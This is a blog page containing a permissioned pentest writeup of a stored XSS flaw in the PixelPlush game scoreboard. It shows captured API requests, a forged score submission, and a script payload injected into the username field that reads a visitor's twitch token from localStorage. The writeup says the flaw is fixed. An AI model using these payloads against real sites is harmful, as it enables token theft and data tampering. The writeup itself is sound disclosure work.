@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>[Writeup] Pentesting XSS in the Pixelplush Scoreboard | daanbreur</title>
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="[Writeup] Pentesting XSS in the Pixelplush Scoreboard" />
+<meta name="author" content="daanbreur" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="This writeup is about the XSS in the PixelPlush Scoreboard." />
+<meta property="og:description" content="This writeup is about the XSS in the PixelPlush Scoreboard." />
+<link rel="canonical" href="https://blog.daanbreur.systems/2021/05/25/PixelPlush-Scoreboard-XSS.html" />
+<meta property="og:url" content="https://blog.daanbreur.systems/2021/05/25/PixelPlush-Scoreboard-XSS.html" />
+<meta property="og:site_name" content="daanbreur" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-05-25T00:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="[Writeup] Pentesting XSS in the Pixelplush Scoreboard" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"daanbreur"},"dateModified":"2021-05-25T00:00:00+00:00","datePublished":"2021-05-25T00:00:00+00:00","description":"This writeup is about the XSS in the PixelPlush Scoreboard.","headline":"[Writeup] Pentesting XSS in the Pixelplush Scoreboard","mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.daanbreur.systems/2021/05/25/PixelPlush-Scoreboard-XSS.html"},"url":"https://blog.daanbreur.systems/2021/05/25/PixelPlush-Scoreboard-XSS.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" /><link type="application/atom+xml" rel="alternate" href="https://blog.daanbreur.systems/feed.xml" title="daanbreur" />
+    <!-- Google Analytics -->
+    <script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+    ga('create', 'UA-92520479-2', 'auto');
+	ga('send', 'pageview', { 'page': location.pathname + location.search + location.hash});
+	ga('set', 'anonymizeIp', true);
+    </script>
+    <!-- End Google Analytics -->
+    </head>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">daanbreur<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        <a class="color-cyan-hover" href="https://twitter.com/portaalg"><i class="fab fa-twitter"></i></a><a class="color-purple-hover" href="https://www.twitch.tv/portaalgaming"><i class="fab fa-twitch"></i></a><a class="color-red-hover" href="https://www.youtube.com/channel/UCGWs9foruVqIoEf2sLBfJAg"><i class="fab fa-youtube"></i></a><a class="color-yellow-hover" href="https://github.com/daanbreur"><i class="fab fa-github"></i></a>
+    </span>
+  </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        
+  <div class="author-box">
+    
+    
+        <img src="
+            https://github.com/daanbreur.png
+        " class="author-avatar" alt="Avatar" />
+    
+Hey, I am Daan. A programmer and hacker.
+</div>
+
+
+<div class="post">
+  <h1 class="post-title">[Writeup] Pentesting | XSS in the Pixelplush Scoreboard</h1>
+  
+  <div class="post-tags">
+      
+      <a class="tag" href="/tag/xss/">xss</a>
+      
+      <a class="tag" href="/tag/pixelplush/">pixelplush</a>
+      
+  </div>
+  
+  <div class="post-date">Published on 25 May 2021</div>
+  
+  <p>This writeup is about the <strong>XSS in the <a href="https://pixelplush.dev">PixelPlush</a> Scoreboard</strong>.</p>
+
+<p>NOTE: Please always ask for permissions when pentesting a website!</p>
+
+<p>When I decided to pentest <a href="https://pixelplush.dev">PixelPlush</a> (ofcourse with permission), I was looking for possible vulnerable endpoints that possibly reflect data into a page. I saw that the site has a scoreboard for the Parachute game, and decided this is a nice place to start.</p>
+
+<p>First I took a look at the requests the page made, This one stood out.</p>
+
+<p><img src="/assets/CTFs/Pentesting/PixelPlush-Scoreboard-XSS/get-scoreboard-scores.png" alt="" /></p>
+
+<p>It returns JSON, In this case an array with objects that contain the username, the score and the user-id.</p>
+
+<p>I will provide a example object below.</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+  </span><span class="nl">"userId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"13371337"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"username"</span><span class="p">:</span><span class="w"> </span><span class="s2">"leethaxor"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"user"</span><span class="p">:</span><span class="w"> </span><span class="s2">"leethaxor"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"score"</span><span class="p">:</span><span class="w"> </span><span class="mf">99.99</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"created"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2021-05-13T17:16:29.468Z"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"updated"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2021-05-13T17:16:29.468Z"</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Now we need to know the endpoint that submits the points.</p>
+
+<p>We can simply do this by starting the overlay ourselves and playing it, while having burp open to capture any requests it makes. Finally after a few tries I win some points and a request is made.</p>
+
+<p><img src="/assets/CTFs/Pentesting/PixelPlush-Scoreboard-XSS/post-add-score.png" alt="" /></p>
+
+<p>The data being send is a JSON Object (sample down below)</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+  </span><span class="nl">"token"</span><span class="p">:</span><span class="w"> </span><span class="s2">"REDACTED"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"channel"</span><span class="p">:</span><span class="w"> </span><span class="s2">"portaalgaming"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"game"</span><span class="p">:</span><span class="w"> </span><span class="s2">"parachute"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"theme"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Pixel Parachute (Day)"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"user"</span><span class="p">:</span><span class="w"> </span><span class="s2">"PortaalGaming"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"score"</span><span class="p">:</span><span class="w"> </span><span class="s2">"92.98"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"userId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"244294836"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"username"</span><span class="p">:</span><span class="w"> </span><span class="s2">"portaalgaming"</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>The URL its being send to is https://api.pixelplush.dev/v1/scores/add</p>
+
+<p>Lets send this request to the repeater in Burp Suite. First we can test changing the score count over 100, cause 100 is the limit of the game.</p>
+
+<p>Lets send the following request</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/v1/scores/add</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">api.pixelplush.dev</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">206</span>
+<span class="na">Sec-Ch-Ua</span><span class="p">:</span> <span class="s">" Not A;Brand";v="99", "Chromium";v="90", "Microsoft Edge";v="90"</span>
+<span class="na">Dnt</span><span class="p">:</span> <span class="s">1</span>
+<span class="na">Sec-Ch-Ua-Mobile</span><span class="p">:</span> <span class="s">?0</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 Edg/90.0.818.66</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/plain;charset=UTF-8</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">*/*</span>
+<span class="na">Origin</span><span class="p">:</span> <span class="s">https://www.pixelplush.dev</span>
+<span class="na">Sec-Fetch-Site</span><span class="p">:</span> <span class="s">same-site</span>
+<span class="na">Sec-Fetch-Mode</span><span class="p">:</span> <span class="s">cors</span>
+<span class="na">Sec-Fetch-Dest</span><span class="p">:</span> <span class="s">empty</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">https://www.pixelplush.dev/</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.9,nl;q=0.8</span>
+<span class="na">Sec-Gpc</span><span class="p">:</span> <span class="s">1</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+
+{"token":"REDACTED","channel":"portaalgaming","game":"writeup","theme":"Pixel Parachute (Day)","user":"PortaalGaming","score":"999999","userId":"244294836","username":"portaalgaming"}
+</code></pre></div></div>
+
+<p>When we now open the page (or send a request to the points endpoint). And yes it set the amount of points, to over 100.</p>
+
+<p><img src="/assets/CTFs/Pentesting/PixelPlush-Scoreboard-XSS/get-scoreboard-faked-points.png" alt="" /></p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="w">
+  </span><span class="p">{</span><span class="w">
+    </span><span class="nl">"userId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"244294836"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"username"</span><span class="p">:</span><span class="w"> </span><span class="s2">"portaalgaming"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"user"</span><span class="p">:</span><span class="w"> </span><span class="s2">"PortaalGaming"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"score"</span><span class="p">:</span><span class="w"> </span><span class="mi">999999</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"created"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2021-05-25T08:17:56.807Z"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"updated"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2021-05-25T08:17:56.807Z"</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+</span><span class="p">]</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Now that we know the score isn’t safe, lets try to inject html into the user field. Maybe it will work.</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+  </span><span class="nl">"token"</span><span class="p">:</span><span class="w"> </span><span class="s2">"REDACTED"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"channel"</span><span class="p">:</span><span class="w"> </span><span class="s2">"portaalgaming"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"game"</span><span class="p">:</span><span class="w"> </span><span class="s2">"writeup"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"theme"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Pixel Parachute (Day)"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"user"</span><span class="p">:</span><span class="w"> </span><span class="s2">"&lt;b&gt;PortaalGaming"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"score"</span><span class="p">:</span><span class="w"> </span><span class="s2">"1337"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"userId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"244294836"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"username"</span><span class="p">:</span><span class="w"> </span><span class="s2">"portaalgaming"</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>And the server returns with</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w"> </span><span class="nl">"success"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Nice, it injected the code into the website. (Please note that this now has been fixed and you cant exploit it anymore)</p>
+
+<p>Now lets inject some JavaScript to alert your twitch token. The twitch token is saved inside of the localStorage.</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+  </span><span class="nl">"token"</span><span class="p">:</span><span class="w"> </span><span class="s2">"REDACTED"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"channel"</span><span class="p">:</span><span class="w"> </span><span class="s2">"portaalgaming"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"game"</span><span class="p">:</span><span class="w"> </span><span class="s2">"writeup"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"theme"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Pixel Parachute (Day)"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"user"</span><span class="p">:</span><span class="w"> </span><span class="s2">"&lt;script&gt;alert('H4x3d by Daanbreur. Your twitch token is: '+localStorage.getItem('twitchToken'))&lt;/script&gt;"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"score"</span><span class="p">:</span><span class="w"> </span><span class="s2">"1337"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"userId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"244294836"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"username"</span><span class="p">:</span><span class="w"> </span><span class="s2">"portaalgaming"</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>And if you now open the website, navigate to the scoreboard and open my page, you would have been greeted with an alert that told your twitch token!</p>
+
+<p><img src="/assets/CTFs/Pentesting/PixelPlush-Scoreboard-XSS/xss-alert.png" alt="" /></p>
+
+<p><strong>Big Thanks to <a href="https://twitch.tv/instafluff">Instafluff</a> Creator of Pixelplush for letting me pentest the website and write this writeup!</strong></p>
+
+</div>
+
+
+
+
+
+<div class="related">
+  <h2>related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/2022/03/26/htb-Secret.html">
+            [Writeup] HackTheBox | Secret
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/2022/03/15/UTCTF2022-Websockets.html">
+            [Writeup] UTCTF 2022 | Websockets?
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/2021/05/28/htb-Delivery.html">
+            [Writeup] HackTheBox | Delivery
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+  
+  <h2>all tags</h2>
+  <div class="tag-cloud"><a href="/tag/authentication/" class="set-1">authentication</a> <a href="/tag/bruteforcing/" class="set-1">bruteforcing</a> <a href="/tag/encryption/" class="set-1">encryption</a> <a href="/tag/hackthebox/" class="set-3">hackthebox</a> <a href="/tag/jinja2/" class="set-1">jinja2</a> <a href="/tag/jwt/" class="set-1">jwt</a> <a href="/tag/linux/" class="set-3">linux</a> <a href="/tag/misconfiguration/" class="set-1">misconfiguration</a> <a href="/tag/mongodb/" class="set-1">mongodb</a> <a href="/tag/nodejs/" class="set-1">nodejs</a> <a href="/tag/nosqlinjection/" class="set-1">nosqlinjection</a> <a href="/tag/passwordreuse/" class="set-1">passwordreuse</a> <a href="/tag/pathhijacking/" class="set-1">pathhijacking</a> <a href="/tag/pixelplush/" class="set-1">pixelplush</a> <a href="/tag/python/" class="set-1">python</a> <a href="/tag/reversing/" class="set-1">reversing</a> <a href="/tag/tryhackme/" class="set-1">tryhackme</a> <a href="/tag/web/" class="set-5">web</a> <a href="/tag/websocket/" class="set-1">websocket</a> <a href="/tag/xss/" class="set-1">xss</a></div>
+  
+
+
+
+      </div>
+    </main><footer class="site-footer">
+  <div class="wrapper">
+    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+
+if (theme === "light") {
+    document.documentElement.setAttribute('data-theme', 'light');
+} else {
+    document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+function activateDarkTheme() {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+	window.localStorage.setItem('theme', 'dark');
+}
+
+function activateLightTheme() {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+	window.localStorage.setItem('theme', 'light');
+}
+
+if (theme === "dark") {
+    activateDarkTheme();
+} else if (theme === "light") {
+    activateLightTheme();
+} else if  (userPrefers === "light") {
+    activateDarkTheme();
+} else {
+    activateDarkTheme();
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    activateLightTheme();
+	} else {
+	    activateDarkTheme();
+	}
+}
+</script></div>
+  </div>
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
